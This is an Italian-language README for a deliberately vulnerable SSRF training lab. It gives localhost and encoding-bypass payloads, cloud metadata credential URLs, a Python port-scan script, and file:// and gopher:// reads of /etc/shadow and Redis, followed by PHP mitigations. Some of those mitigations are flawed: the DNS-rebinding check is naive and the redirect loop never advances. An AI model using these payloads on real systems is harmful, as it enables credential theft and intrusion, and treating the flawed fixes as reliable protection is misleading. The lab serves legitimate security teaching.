# OWASP A10:2021 – Server-Side Request Forgery (SSRF)

## Descrizione del Modulo

Questo laboratorio dimostra vulnerabilità legate a **Server-Side Request Forgery (SSRF)** nella categoria **OWASP A10:2021 – Server-Side Request Forgery (SSRF)**. L'applicazione è un sistema di URL Preview che permette agli utenti di inserire URL e generare anteprime, ma contiene intenzionalmente vulnerabilità SSRF che permettono l'accesso a risorse interne.

## ⚠️ ATTENZIONE

**Questa applicazione contiene vulnerabilità intenzionali. NON utilizzare in produzione o in ambienti reali.**

## Scenario

Sistema di URL Preview che:
- Permette agli utenti di inserire URL per generare anteprime
- Fetcha contenuti web senza validazione
- Permette accesso a risorse interne (localhost, IP privati, metadata services)
- Ha filtri deboli facilmente bypassabili
- Supporta port scanning interno

## Setup

### 1. Avvio Ambiente Docker

```bash
docker-compose up -d
```

L'applicazione sarà disponibile su: `http://localhost:8010`

Il database MySQL sarà accessibile su: `localhost:3310`

Redis sarà accessibile su: `localhost:6370`

### 2. Credenziali Database

- **Host:** `db` (interno Docker) o `localhost:3310` (esterno)
- **Database:** `url_preview`
- **Username:** `root`
- **Password:** `rootpassword`

### 3. Account di Test

| Username | Password | Ruolo |
|----------|----------|-------|
| admin | password | admin |
| mario.rossi | password | user |
| lucia.verdi | password | user |

## Vulnerabilità Presenti

### 1. Fetch URL Senza Validazione

**File:** `url_fetcher.php`, `preview.php`

**Descrizione:** Il sistema fetcha URL senza validazione, permettendo a un attaccante di inserire qualsiasi URL, inclusi localhost, IP privati, metadata services, e protocolli pericolosi.

**Impatto:**
- Accesso a risorse interne
- Port scanning
- Accesso a metadata services (AWS, GCP, Azure)
- Bypass di controlli di sicurezza
- Accesso a servizi interni (database, Redis, API)

**Come sfruttarla:**

#### Passo 1: Accesso a Localhost

1. Accedi al sistema: `http://localhost:8010`
2. Login: `admin` / `password`
3. Vai su "Crea Preview"
4. Inserisci: `http://localhost`
5. Clicca su "Crea Preview"
6. **Nota:** Il sistema fetcha localhost e mostra il contenuto!

**Payload alternativi:**
- `http://127.0.0.1`
- `http://127.1` (shortened IP)
- `http://[::1]` (IPv6)
- `http://2130706433` (decimal IP)
- `http://0x7f000001` (hex IP)

#### Passo 2: Accesso a IP Privati

1. Inserisci: `http://192.168.1.1`
2. **Nota:** Il sistema fetcha IP privati senza restrizioni!

**Range IP privati:**
- `10.0.0.0/8` (10.0.0.0 - 10.255.255.255)
- `192.168.0.0/16` (192.168.0.0 - 192.168.255.255)
- `172.16.0.0/12` (172.16.0.0 - 172.31.255.255)

#### Passo 3: Accesso a Metadata Services

**AWS Metadata Service:**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data
```

**Google Cloud Metadata:**
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
```

**Azure Metadata:**
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

1. Inserisci uno degli URL sopra
2. **Nota:** Il sistema fetcha metadata services e mostra informazioni sensibili!

### 2. Port Scanning Interno

**File:** `url_fetcher.php`, `preview.php`

**Descrizione:** Il sistema permette di specificare porte arbitrarie, permettendo port scanning di servizi interni.

**Come sfruttarla:**

#### Passo 1: Scansionare Porte Comuni

1. Prova queste porte comuni:
   - `http://127.0.0.1:3306` (MySQL)
   - `http://127.0.0.1:6379` (Redis)
   - `http://127.0.0.1:8080` (HTTP)
   - `http://127.0.0.1:22` (SSH - se esposto via HTTP)
   - `http://127.0.0.1:80` (Apache/Nginx)
   - `http://127.0.0.1:5432` (PostgreSQL)

2. **Nota:** Se una porta è aperta, vedrai il contenuto o un errore specifico!

#### Passo 2: Script per Port Scanning

Crea uno script Python per automatizzare:

```python
import requests

base_url = "http://localhost:8010"
login_url = f"{base_url}/login_process.php"
preview_url = f"{base_url}/preview.php"

# Login
session = requests.Session()
session.post(login_url, data={
    "username": "admin",
    "password": "password"
})

# Porte comuni da scansionare
ports = [22, 80, 443, 3306, 5432, 6379, 8080, 9200, 27017]

for port in ports:
    url = f"http://127.0.0.1:{port}"
    response = session.post(preview_url, data={
        "url": url,
        "method": "file_get_contents"
    })
    
    if "success" in response.text.lower() or "connection" not in response.text.lower():
        print(f"✅ Porta {port} potrebbe essere aperta")
    else:
        print(f"❌ Porta {port} chiusa o non accessibile")
```

### 3. Bypass Filtri con Encoding

**File:** `url_fetcher.php`

**Descrizione:** Il sistema ha un filtro debole che può essere bypassato facilmente con tecniche di encoding.

**Come sfruttarla:**

#### Passo 1: URL Encoding

1. Inserisci: `http://127.0.0.1` (bloccato dal filtro)
2. Bypass con: `http://127.0.0.%31` (URL encoding)
3. Bypass con: `http://127.0.0.0x01` (hex encoding)

#### Passo 2: Double Encoding

1. Inserisci: `http://127.0.0.1`
2. Bypass con: `http://127.0.0.%2531` (double encoding)

#### Passo 3: IPv6

1. Inserisci: `http://[::1]` (IPv6 localhost)
2. **Nota:** Il filtro non controlla IPv6!

#### Passo 4: Decimal/Hex IP

1. Decimal: `http://2130706433` (127.0.0.1 in decimal)
2. Hex: `http://0x7f000001` (127.0.0.1 in hex)
3. Octal: `http://0177.0.0.1` (127.0.0.1 in octal)

#### Passo 5: DNS Rebinding

1. Usa un dominio che risolve a localhost:
   - `http://localtest.me` (risolve a 127.0.0.1)
   - `http://127.0.0.1.nip.io` (risolve a 127.0.0.1)

### 4. Accesso a Servizi Interni

**File:** `url_fetcher.php`, `preview.php`

**Descrizione:** Il sistema permette l'accesso a servizi interni come database, Redis, API interne.

**Come sfruttarla:**

#### Passo 1: Accesso a MySQL

1. Inserisci: `http://127.0.0.1:3306`
2. **Nota:** Se MySQL è esposto via HTTP (raro), vedrai informazioni!

#### Passo 2: Accesso a Redis

1. Inserisci: `http://127.0.0.1:6379`
2. **Nota:** Se Redis è esposto via HTTP, potresti vedere dati!

#### Passo 3: Accesso ad API Interne

1. Prova: `http://127.0.0.1:8080/api/admin`
2. Prova: `http://127.0.0.1/api/users`
3. **Nota:** Se ci sono API interne, potresti accedervi!

### 5. Protocolli Pericolosi

**File:** `url_fetcher.php`

**Descrizione:** Il sistema supporta protocolli pericolosi come `file://`, `gopher://`, `dict://` (con cURL).

**Come sfruttarla:**

#### Passo 1: File Protocol

1. Inserisci: `file:///etc/passwd`
2. Seleziona metodo: `curl`
3. **Nota:** Potresti leggere file locali!

**File da provare:**
- `file:///etc/passwd`
- `file:///etc/shadow`
- `file:///var/www/html/config.php`
- `file:///proc/self/environ`

#### Passo 2: Gopher Protocol (con cURL)

1. Inserisci: `gopher://127.0.0.1:6379/_INFO`
2. Seleziona metodo: `curl`
3. **Nota:** Gopher può essere usato per interagire con servizi!

#### Passo 3: Dict Protocol (con cURL)

1. Inserisci: `dict://127.0.0.1:6379/INFO`
2. Seleziona metodo: `curl`
3. **Nota:** Dict può essere usato per interagire con servizi!

## Esercizi Pratici

### Esercizio 1: Accesso a Localhost

1. Accedi al sistema
2. Prova ad accedere a `http://localhost`
3. Prova vari metodi di bypass (encoding, IPv6, decimal IP)
4. Verifica quale metodo funziona

### Esercizio 2: Port Scanning

1. Crea uno script per scansionare porte comuni (22, 80, 3306, 6379, 8080)
2. Identifica quali porte sono aperte
3. Prova ad accedere ai servizi esposti

### Esercizio 3: Metadata Services

1. Prova ad accedere a metadata services AWS/GCP/Azure
2. Estrai informazioni sensibili (se disponibili)
3. Verifica quali informazioni sono accessibili

### Esercizio 4: Bypass Filtri

1. Identifica il filtro implementato
2. Prova vari metodi di bypass (encoding, IPv6, DNS rebinding)
3. Documenta quali metodi funzionano

### Esercizio 5: Accesso a Servizi Interni

1. Identifica servizi interni disponibili (MySQL, Redis, API)
2. Prova ad accedere a questi servizi
3. Estrai informazioni sensibili

## Mitigazioni (Da Implementare)

### Per Validazione URL:

1. **Whitelist di Domini Consentiti:**
   ```php
   // ✅ CORRETTO: Solo domini specifici consentiti
   $allowed_domains = ['example.com', 'trusted-site.com'];
   $parsed_url = parse_url($url);
   if (!in_array($parsed_url['host'], $allowed_domains)) {
       die("Domain not allowed");
   }
   ```

2. **Blacklist di IP Privati:**
   ```php
   // ✅ CORRETTO: Blocca IP privati
   function isPrivateIP($ip) {
       return !filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE);
   }
   
   $parsed_url = parse_url($url);
   $host = $parsed_url['host'];
   $ip = gethostbyname($host);
   if (isPrivateIP($ip)) {
       die("Private IP not allowed");
   }
   ```

3. **Blocca Localhost:**
   ```php
   // ✅ CORRETTO: Blocca localhost in tutte le forme
   $blocked_hosts = ['localhost', '127.0.0.1', '::1', '0.0.0.0'];
   $parsed_url = parse_url($url);
   $host = $parsed_url['host'];
   $ip = gethostbyname($host);
   
   if (in_array($host, $blocked_hosts) || in_array($ip, $blocked_hosts)) {
       die("Localhost not allowed");
   }
   ```

4. **Blocca Metadata Services:**
   ```php
   // ✅ CORRETTO: Blocca metadata services
   $blocked_ips = ['169.254.169.254']; // AWS, GCP, Azure
   $parsed_url = parse_url($url);
   $ip = gethostbyname($parsed_url['host']);
   if (in_array($ip, $blocked_ips)) {
       die("Metadata service not allowed");
   }
   ```

### Per Protocolli:

1. **Permetti Solo HTTP/HTTPS:**
   ```php
   // ✅ CORRETTO: Solo HTTP/HTTPS consentiti
   $parsed_url = parse_url($url);
   $scheme = $parsed_url['scheme'] ?? '';
   if (!in_array($scheme, ['http', 'https'])) {
       die("Only HTTP/HTTPS allowed");
   }
   ```

2. **cURL con Protocolli Limitati:**
   ```php
   // ✅ CORRETTO: Limita protocolli cURL
   curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
   curl_setopt($ch, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
   ```

### Per Redirect:

1. **Disabilita Redirect:**
   ```php
   // ✅ CORRETTO: Non seguire redirect
   curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
   ```

2. **Valida Redirect:**
   ```php
   // ✅ CORRETTO: Valida ogni redirect
   $max_redirects = 3;
   $redirect_count = 0;
   while ($redirect_count < $max_redirects) {
       // Fetch URL
       // Se redirect, valida nuovo URL prima di seguirlo
       if (isRedirect($response)) {
           $new_url = getRedirectURL($response);
           if (!isURLAllowed($new_url)) {
               die("Redirect to disallowed URL");
           }
       }
   }
   ```

### Per DNS:

1. **Risolvi DNS e Valida IP:**
   ```php
   // ✅ CORRETTO: Risolvi DNS e valida IP
   $parsed_url = parse_url($url);
   $host = $parsed_url['host'];
   $ip = gethostbyname($host);
   
   // Valida IP dopo risoluzione DNS
   if (isPrivateIP($ip) || isLocalhost($ip)) {
       die("Resolved to private/localhost IP");
   }
   ```

2. **DNS Rebinding Protection:**
   ```php
   // ✅ CORRETTO: Verifica che DNS non cambi
   $ip1 = gethostbyname($host);
   sleep(1);
   $ip2 = gethostbyname($host);
   if ($ip1 !== $ip2) {
       die("DNS rebinding detected");
   }
   ```

### Per Timeout e Limiti:

1. **Timeout Breve:**
   ```php
   // ✅ CORRETTO: Timeout breve per limitare port scanning
   curl_setopt($ch, CURLOPT_TIMEOUT, 2); // 2 secondi
   curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 1); // 1 secondo per connessione
   ```

2. **Limita Dimensione Risposta:**
   ```php
   // ✅ CORRETTO: Limita dimensione risposta
   curl_setopt($ch, CURLOPT_MAXFILESIZE, 1024 * 1024); // 1MB max
   ```

## Riferimenti OWASP

- [OWASP Top 10 2021 - A10:2021](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)

## Struttura File

```
A10_Server_Side_Request_Forgery/
├── docker-compose.yml          # Configurazione Docker (web, db, redis)
├── Dockerfile                   # Immagine PHP/Apache
├── init.sql                     # Popolamento database
├── README.md                    # Questa documentazione
├── db_connect.php               # Connessione database
├── url_fetcher.php              # ⚠️ VULNERABILE: Funzioni di fetch SSRF
├── index.php                    # Homepage
├── login.php                    # Pagina login
├── login_process.php            # Processo login
├── register.php                 # Pagina registrazione
├── register_process.php          # Processo registrazione
├── preview.php                  # ⚠️ VULNERABILE: Crea preview URL (SSRF)
├── history.php                  # Storia URL processati
├── admin.php                    # Pannello admin
├── logout.php                   # Logout
├── header.php                   # Header comune
├── footer.php                   # Footer comune
└── style.css                    # Stili CSS
```

## Note Finali

Questo modulo dimostra l'importanza di:
- Validare sempre gli URL prima di fetcharli
- Bloccare accesso a risorse interne (localhost, IP privati)
- Bloccare metadata services
- Limitare protocolli consentiti (solo HTTP/HTTPS)
- Validare redirect
- Proteggere contro DNS rebinding
- Implementare timeout e limiti

**Ricorda:** Queste vulnerabilità sono intenzionali e create per scopi didattici. In produzione, implementa sempre tutte le mitigazioni appropriate.

